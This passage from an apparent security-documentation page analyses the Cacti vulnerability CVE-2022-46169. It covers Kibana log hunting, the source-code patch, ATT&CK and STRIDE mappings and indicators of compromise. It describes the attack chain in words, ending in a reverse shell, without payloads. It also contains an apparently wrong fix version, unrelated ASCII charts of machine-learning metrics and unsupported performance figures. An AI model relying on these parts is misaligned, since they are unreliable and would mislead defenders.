<td>- Set <strong>Timeframe</strong> to <strong>July 19, 2023</strong>.<br>- Use index: <code>filebeat-*</code>.<br>- Paste query in the search field and press <strong>Enter</strong>.</td>
</tr>
<tr>
<td><strong>5. Improve View</strong></td>
<td>Add the following fields as columns using the left sidebar: <strong>source.ip</strong>, <strong>url.path</strong>, <strong>url.query</strong>.</td>
</tr>
<tr>
<td><strong>6. Analyze Results</strong></td>
<td>- View logs related to exploitation of <strong>CVE-2022-46169</strong>.<br>- Observe <strong>source.ip</strong> for attacker IPs.<br>- Check <strong>url.query</strong> for malicious payload injected in the <code>poller_id</code> parameter.</td>
</tr>
<tr>
<td><strong>7. Investigate July 20 Logs</strong></td>
<td>Change <strong>Timeframe</strong> to <strong>July 20, 2023</strong> and analyze events.</td>
</tr>
</tbody>
</table>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../../assets/attachments/cysec/cve/kibana-query.png" data-desc-position="bottom"><img align="center" alt="Kibana" height="600" src="../../../../assets/attachments/cysec/cve/kibana-query.png" width="700"></a></p>
<h4 id="step-5">Step 5<a class="headerlink" href="#step-5" title="Permanent link">¶</a></h4>
<p><strong>Patch Management and Vulnerable Code Mitigation</strong></p>
<table>
<thead>
<tr>
<th><strong>Section</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Challenges in Managing Software</strong></td>
<td>Managing third-party software, like <strong>Cacti</strong>, poses challenges in areas like <strong>scale</strong>, <strong>compliance</strong>, and <strong>security</strong>. Patch management is critical to maintaining stability and security across the organization's IT infrastructure.</td>
</tr>
</tbody>
</table>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../../assets/attachments/cysec/cve/v1.png" data-desc-position="bottom"><img align="center" alt="v1" height="600" src="../../../../assets/attachments/cysec/cve/v1.png" width="700"></a></p>
<h5 id="patch-management-steps"><strong>Patch Management Steps</strong><a class="headerlink" href="#patch-management-steps" title="Permanent link">¶</a></h5>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Patch Identification</strong></td>
<td>Monitor sources like vendors, security advisories, and databases to identify patches. Use a <strong>baseline asset inventory</strong> to map existing software in the organization.</td>
</tr>
<tr>
<td><strong>Patch Assessment</strong></td>
<td>Assess each patch for relevance and criticality. Factors include <strong>vulnerability severity</strong>, compatibility, and impact on the environment.</td>
</tr>
<tr>
<td><strong>Patch Testing</strong></td>
<td>Test patches in controlled environments (e.g., <strong>test networks</strong>) to avoid introducing new issues.</td>
</tr>
<tr>
<td><strong>Patch Deployment</strong></td>
<td>Deploy approved patches based on planned schedules or urgency, ensuring consideration for any prerequisites or dependencies.</td>
</tr>
<tr>
<td><strong>Patch Verification</strong></td>
<td>Verify patch installation with post-deployment testing to ensure stability and security.</td>
</tr>
<tr>
<td><strong>Patch Monitoring</strong></td>
<td>Continuously monitor for new patches, emerging threats, and updates to maintain ongoing protection.</td>
</tr>
<tr>
<td><strong>Key Benefits</strong></td>
<td>Patch management proactively addresses vulnerabilities, preventing third-party software threats and maintaining organizational security.</td>
</tr>
</tbody>
</table>
<hr>
<h5 id="vulnerable-code-mitigation">Vulnerable Code Mitigation<a class="headerlink" href="#vulnerable-code-mitigation" title="Permanent link">¶</a></h5>
<p>As a response of Cacti developers to the vulnerability, a patch was immediately released in version 1.2.3. The fix has prevented the authentication bypass and command injection vulnerabilities on the remote_agent.php endpoint.</p>
<p>To expound further, let's discuss the changes made to the source code.</p>
<p>The source code of Cacti is hosted on GitHub, so we can easily view the commits done during the patch application. For a quick resource, you may use this link to see the essential changes made on the vulnerable endpoint - Resolving CVE-2022-46169.</p>
<p>Based on the resource, it can be seen that the remote_agent.php was updated on the following lines:</p>
<ol>
<li>
<p>The first one is on line 301, which contains <code>$poller_id = get_nfilter_request_var('poller_id');</code>.</p>
</li>
<li>
<p>Next in line 385, which contains the following code:</p>
</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>$cactiphp = proc_open(read_config_option('path_php_binary') ...
</code></pre></div>
<ol>
<li>Lastly, lines 446 and 447, which contains:</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>$poller_id = $config['poller_id']; and $network = ...
</code></pre></div>
<hr>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../../assets/attachments/cysec/cve/v2.png" data-desc-position="bottom"><img align="center" alt="v2" height="600" src="../../../../assets/attachments/cysec/cve/v2.png" width="600"></a></p>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../../assets/attachments/cysec/cve/v3.png" data-desc-position="bottom"><img align="center" alt="v3" height="600" src="../../../../assets/attachments/cysec/cve/v3.png" width="600"></a></p>
<hr>
<p>Moving on to the remaining fixes, it can be seen that the variables on lines 385, 446 and 447 were all sanitised using the cacti_escapeshellarg function. Based on the <a href="https://github.com/Cacti/cacti/blob/992cdba8f8a306ef27bc15617b2756e7db4054aa/lib/functions.php#L4949">source code</a>, it can be seen on /lib/functions.php documentation that the function uses the escapeshellarg built-in PHP function to wrap the argument in a single string via single quotes, preventing potential command injection attempts.</p>
<hr>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../../assets/attachments/cysec/cve/v4.png" data-desc-position="bottom"><img align="center" alt="v4" height="600" src="../../../../assets/attachments/cysec/cve/v4.png" width="600"></a></p>
<hr>
<h5 id="vulnerable-code-mitigation-fix-for-cve-2022-46169"><strong>Vulnerable Code Mitigation: Fix for CVE-2022-46169</strong><a class="headerlink" href="#vulnerable-code-mitigation-fix-for-cve-2022-46169" title="Permanent link">¶</a></h5>
<table>
<thead>
<tr>
<th><strong>Fix Details</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Patch Release</strong></td>
<td>A patch was released in <strong>Cacti version 1.2.3</strong> to address the vulnerabilities in <code>remote_agent.php</code>, including <strong>authentication bypass</strong> and <strong>command injection</strong>.</td>
</tr>
<tr>
<td><strong>Key Updated Lines (remote_agent.php)</strong></td>
<td>- <strong>Line 301</strong>: Replaced <code>get_nfilter_request_var</code> with <code>get_filter_request_var</code>. <br>- <strong>Line 385</strong>: Sanitized variable using <code>cacti_escapeshellarg</code>. <br>- <strong>Lines 446-447</strong>: Same sanitizations applied using <code>cacti_escapeshellarg</code>.</td>
</tr>
</tbody>
</table>
<hr>
<p>The first fix, on line 301, is about replacing the get_nfilter_request_var function with get_filter_request_var. According to the source code of Cacti, the disabled link documentation of these functions can be seen in /lib/html_utility.php.</p>
<p>The get_nfilter_request_var function allows arbitrary strings, and returns the same value if the parameter exists in the request, else it will return a default value.</p>
<hr>
<p>Lastly, the patch for the authentication bypass was implemented on the get_client_addr function of /lib/functions.php. As shown in the patch difference., it can be seen that the usage of custom HTTP headers was removed. This fix prevents attackers from arbitrarily setting the client IP; only the REMOTE_ADDR variable is used by default. To maintain the application's functionality, the applied fix allows administrators to configure what HTTP proxy headers are acknowledged when determining the client IP.</p>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../../assets/attachments/cysec/cve/v5.png" data-desc-position="bottom"><img align="center" alt="v5" height="600" src="../../../../assets/attachments/cysec/cve/v5.png" width="600"></a></p>
<h5 id="mitigation-details"><strong>Mitigation Details</strong><a class="headerlink" href="#mitigation-details" title="Permanent link">¶</a></h5>
<table>
<thead>
<tr>
<th><strong>Change</strong></th>
<th><strong>Before Fix</strong></th>
<th><strong>After Fix</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Line 301</strong>: Input Validation</td>
<td>Function <code>get_nfilter_request_var</code>: Allows <strong>arbitrary strings</strong> as inputs, leading to potential injection.</td>
<td>Replaced with <code>get_filter_request_var</code>, which <strong>restricts inputs to integers</strong>, preventing command injection in the <code>poller_id</code> parameter.</td>
</tr>
<tr>
<td><strong>Lines 385, 446, 447</strong>: Sanitization</td>
<td>Variables were unsanitized, making them vulnerable to injection through shell commands.</td>
<td>Sanitized variables using <code>cacti_escapeshellarg</code> (uses <strong>PHP’s <code>escapeshellarg</code></strong> to escape input).</td>
</tr>
<tr>
<td><strong>Authentication Bypass Fix</strong></td>
<td>Function <code>get_client_addr</code> allowed overrides using custom HTTP headers, enabling attackers to bypass authentication.</td>
<td>Removed custom HTTP headers. Now only the <strong>REMOTE_ADDR</strong> variable is used as the default to determine client IP, unless explicitly configured for proxy headers.</td>
</tr>
</tbody>
</table>
<hr>
<h5 id="source-code-references"><strong>Source Code References</strong><a class="headerlink" href="#source-code-references" title="Permanent link">¶</a></h5>
<table>
<thead>
<tr>
<th><strong>File/Function</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/lib/html_utility.php</code></td>
<td>- <strong><code>get_nfilter_request_var</code></strong>: Allowed arbitrary strings. <br> - <strong><code>get_filter_request_var</code></strong>: Restricted input to integers, addressing injection risks.</td>
</tr>
<tr>
<td><code>/lib/functions.php</code></td>
<td>- <strong><code>cacti_escapeshellarg</code></strong>: Wrapper for PHP’s <code>escapeshellarg</code>, protecting arguments with single quotes to prevent command execution. <br> - <strong><code>get_client_addr</code></strong>: Updated to restrict IP determination to <code>REMOTE_ADDR</code>.</td>
</tr>
<tr>
<td><strong>Patch Link</strong></td>
<td>View the patch differences and source code changes <a href="https://github.com/Cacti/cacti/blob/992cdba8f8a306ef27bc15617b2756e7db4054aa/lib/functions.php#L4949">here</a> for resolving <strong>CVE-2022-46169</strong>.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="cve-2022-46169-analysis-and-mapping"><strong>CVE-2022-46169: Analysis and Mapping</strong><a class="headerlink" href="#cve-2022-46169-analysis-and-mapping" title="Permanent link">¶</a></h2>
<h3 id="step-1-mitre-attck-ttps-mapping"><strong>Step 1: MITRE ATT&amp;CK TTPs Mapping</strong><a class="headerlink" href="#step-1-mitre-attck-ttps-mapping" title="Permanent link">¶</a></h3>
<p><strong>Tactics:</strong></p>
<ul>
<li><strong>Initial Access</strong></li>
<li><strong>Privilege Escalation</strong></li>
<li><strong>Execution</strong></li>
<li><strong>Defense Evasion</strong></li>
</ul>
<p><strong>Techniques:</strong></p>
<ul>
<li>T1078.001: Valid Accounts - Default Accounts</li>
<li>T1071.001: Application Layer Protocol - Web Protocol</li>
<li>T1190: Exploit Public-Facing Application</li>
<li>T1059.003: Command and Scripting Interpreter - Windows Command Shell</li>
<li>T1203: Exploitation for Client Execution</li>
</ul>
<p><strong>Procedures:</strong></p>
<ol>
<li>Exploiting insufficient IP validation in <code>remote_agent.php</code> by manipulating the <code>X-Forwarded-For</code> HTTP header.</li>
<li>Brute-forcing or discovering valid <code>host_id</code> and <code>local_data_ids</code> parameters.</li>
<li>Leveraging a malicious <code>poller_id</code> parameter to execute system commands unsanitized (via PHP <code>proc_open()</code>).</li>
<li>Establishing a reverse shell through the injected command payload.</li>
</ol>
<hr>
<h3 id="step-2-roc-curve-for-vulnerabilities-cvss-based"><strong>Step 2: ROC Curve for Vulnerabilities (CVSS-Based)</strong><a class="headerlink" href="#step-2-roc-curve-for-vulnerabilities-cvss-based" title="Permanent link">¶</a></h3>
<p><strong>ROC (Receiver Operating Characteristic) Curve for CVSS:</strong><br>
This curve represents the True Positive Rate (TPR) against the False Positive Rate (FPR), based on severity classification.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>ROC Curve: TPR vs FPR
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>    1.00 |                                                            ________
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>         |                                                       ====|       |
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>         |                                                  ====           (High severity CVSS &gt; 8.0) → x (Target 1)
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>         |                                              ====
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>  TPR    |                                           ===         x Label: Sensitivity = 0.80
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>         |                                          ==
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>    0.75 |                                     x  ===           x Label: Medium severity (CVSS 4.0–7.9)
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>         |                                   ==
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>    0.50 |                               ===
<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>         |                             ==
<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>    0.25 |                        x ===
<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>         |                      ==        x Low severity CVSS &lt; 4.0 (Target 2)
<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>    0.00 |_________x________x________x________________________________________
<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>                  0.00     0.25    0.50    0.75    1.00 FPR
<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>        Low FPR Thresholds → Increasing Severity → High FPR Thresholds
</code></pre></div>
<p><strong>Labels:</strong></p>
<ul>
<li><code>x</code> = Target Positions</li>
<li>High severity: CVSS &gt; 8.0</li>
<li>Medium severity: CVSS 4.0–7.9</li>
<li>Low severity: CVSS &lt; 4.0</li>
<li>X-axis: False Positive Rate (FPR)</li>
<li>Y-axis: True Positive Rate (TPR)</li>
</ul>
<hr>
<h3 id="step-3-ttd-time-to-detect-and-ttr-time-to-respond"><strong>Step 3: TTD (Time to Detect) and TTR (Time to Respond)</strong><a class="headerlink" href="#step-3-ttd-time-to-detect-and-ttr-time-to-respond" title="Permanent link">¶</a></h3>
<p>This section illustrates how quickly detection and response occur for CVE-2022-46169.</p>
<h4 id="chart-for-ttd-and-ttr">Chart for TTD and TTR<a class="headerlink" href="#chart-for-ttd-and-ttr" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Time to Detection (TTD) and Time to Response (TTR)
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>       |&lt;-----TTD----&gt;|&lt;-------------TTR-------------&gt;|
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>      _________                            ________
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>     |         |-------------------------&gt;|        |
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>T(0) Detection Initiated            Response Finalized
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Timeline legend:
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>- TTD: Time from exploitation to detection (e.g., log monitoring, SIEM triggers).
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>- TTR: Time taken to respond, patch, isolate endpoints, and remediate access.
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>- Example: Detection at T+2hrs, Response complete at T+6hrs.
</code></pre></div>
<hr>
<h3 id="step-4-predictive-performance-metrics"><strong>Step 4: Predictive Performance Metrics</strong><a class="headerlink" href="#step-4-predictive-performance-metrics" title="Permanent link">¶</a></h3>
<p>Estimate metrics such as F1 score, Recall (Sensitivity), and Precision based on prediction models for vulnerability detection:</p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Predicted Value</strong></th>
<th><strong>Actual Value (Observed in Real Scenario)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>F1 Score</strong></td>
<td>0.84</td>
<td>0.79</td>
</tr>
<tr>
<td><strong>Recall</strong></td>
<td>0.86</td>
<td>0.75</td>
</tr>
<tr>
<td><strong>Precision</strong></td>
<td>0.82</td>
<td>0.83</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="step-5-variance-bias-tradeoff-sampling-methods"><strong>Step 5: Variance-Bias Tradeoff &amp; Sampling Methods</strong><a class="headerlink" href="#step-5-variance-bias-tradeoff-sampling-methods" title="Permanent link">¶</a></h3>
<h4 id="variance-bias-tradeoff-with-roc-curve"><strong>Variance-Bias Tradeoff with ROC Curve:</strong><a class="headerlink" href="#variance-bias-tradeoff-with-roc-curve" title="Permanent link">¶</a></h4>
<p>Here, we illustrate scenarios of overfitting, correct fitting, and underfitting.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Variance-Bias Tradeoff ROC Curve
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>    1.00 | A______x_Label (Overfitting - High Variance)
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>         |   \
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>  TPR    |    \       x_Label B: Balanced Tradeoff (Correct Fit)
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>         |     \
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>    0.75 |      \    x_Label C: High Bias Underfitting (Missed Positive Detections)
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>         |       \_
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>    0.50 |________|_________________________________
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>                 A       B            C
<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>              High    Balanced      High
<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>           Variance   Tradeoff      Bias
</code></pre></div>
<hr>
<h4 id="cross-validation-sampling"><strong>Cross-Validation Sampling:</strong><a class="headerlink" href="#cross-validation-sampling" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Cross-Validation Sampling:
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>                Fold 1    Fold 2    Fold 3     Fold 4
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Training:      [****]    [****]    [****]
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>Validation:    [ ** ]    [ ** ]              Validation applied to partitions
</code></pre></div>
<hr>
<h4 id="bootstrapping-sampling"><strong>Bootstrapping Sampling:</strong><a class="headerlink" href="#bootstrapping-sampling" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Bootstrapped Data Representation
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a> | | | |  (Randomly Resampled Observations)
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a> | *   *
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>Observations grouped over multiple training + test performances.
</code></pre></div>
<hr>
<h4 id="stratified-sampling-chart"><strong>Stratified Sampling Chart:</strong><a class="headerlink" href="#stratified-sampling-chart" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Stratified Sampling:
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>    | Balanced Distribution |
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>       Training  [**** ****]
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>       Validation [**  **]
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>        Balanced across CVSS Severity Levels
</code></pre></div>
<hr>
<h3 id="step-6-stride-threat-metrics-mapping"><strong>Step 6: STRIDE Threat Metrics Mapping</strong><a class="headerlink" href="#step-6-stride-threat-metrics-mapping" title="Permanent link">¶</a></h3>
<p>Mapping CVE-2022-46169 to the STRIDE framework ensures we identify specific threat categories.</p>
<table>
<thead>
<tr>
<th><strong>STRIDE Component</strong></th>
<th><strong>Associated Threat in CVE-2022-46169</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Spoofing</strong></td>
<td>Manipulation of <code>X-Forwarded-For</code> HTTP header to bypass authentication.</td>
</tr>
<tr>
<td><strong>Tampering</strong></td>
<td>Injection into <code>poller_id</code> to execute malicious system commands.</td>
</tr>
<tr>
<td><strong>Repudiation</strong></td>
<td>Remote attacker anonymization via spoofed IP addresses.</td>
</tr>
<tr>
<td><strong>Information Disclosure</strong></td>
<td>Accessing sensitive internal resources via brute-forced <code>host_id</code> and <code>local_data_ids</code>.</td>
</tr>
<tr>
<td><strong>Denial of Service</strong></td>
<td>Potential exploitation impact (e.g., heavy reverse shell traffic).</td>
</tr>
<tr>
<td><strong>Elevation of Privilege</strong></td>
<td>Unauthorized command execution through RCE in vulnerable endpoints.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="step-7-vulnerability-ttp-mapping"><strong>Step 7: Vulnerability-TTP Mapping</strong><a class="headerlink" href="#step-7-vulnerability-ttp-mapping" title="Permanent link">¶</a></h3>
<p>Final table showcasing vulnerabilities and techniques used.</p>
<table>
<thead>
<tr>
<th><strong>Vulnerability</strong></th>
<th><strong>Associated Tactic/Technique</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Authentication Bypass</td>
<td><strong>T1190</strong>: Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Remote Code Execution</td>
<td><strong>T1059</strong> (Command and Scripting Interpreter) via <code>poller_id</code> unsanitized input</td>
</tr>
<tr>
<td>Parameter Brute-forcing</td>
<td><strong>T1071.001</strong>: Bruteforcing IDs used in the input parameters (<code>host_id</code>, <code>local_data_ids</code>, etc.)</td>
</tr>
<tr>
<td>Reverse Shell Execution</td>
<td><strong>T1203</strong>: Exploitation for Client Execution</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="indicators-of-compromise-ioc"><strong>Indicators of Compromise (IoC)</strong><a class="headerlink" href="#indicators-of-compromise-ioc" title="Permanent link">¶</a></h3>
<ul>
<li>Logs showing anomalies in <code>X-Forwarded-For</code> headers.</li>
<li>Unexpected traffic spikes from internal Cacti hosts.</li>
<li>Shell activity logs indicating spawned reverse shells or command execution.</li>
<li>Access to or modification of <code>remote_agent.php</code>.</li>
</ul>









  



  <form class="md-feedback" name="feedback" hidden>
    <fieldset>
      <legend class="md-feedback__title">
        Was this page helpful?
      </legend>
      <div class="md-feedback__inner">
        <div class="md-feedback__list">
          
            <button class="md-feedback__icon md-icon" type="submit" title="This_page_was_helpful" data-md-value="1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"></path></svg>
            </button>
          
            <button class="md-feedback__icon md-icon" type="submit" title="This_page_could_be_improved" data-md-value="0">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"></path></svg>
            </button>
          
        </div>
        <div class="md-feedback__note">
          
            <div data-md-value="1" hidden>
              
              
                
              
              
              
                
                
              
              Thanks for your feedback!
            </div>
          
            <div data-md-value="0" hidden>
              
              
                
              
              
              
                
                
              
              Thanks for your feedback! Help us improve this page by using our <a href="https://docs.google.com/forms/d/e/1FAIpQLSePtZh6Upj2tconoH43yqadxL2W-wo0coms41yjysY_Amyqzw/viewform?usp=pp_url&amp;entry.853143515=/browser-support/" target="_blank" rel="noopener">feedback form</a>.  
            </div>
          
        </div>
      </div>
    </fieldset>
  </form>


                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      © 2023 <a href="https://github.com/armanriazi" target="_blank" rel="noopener">Arman Riazi</a>

    </div>
  
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
    <a href="https://twitter.com/meta_armanriazi" target="_blank" rel="noopener" title="ArmanRiazi on Twitter" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/armanriazi" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 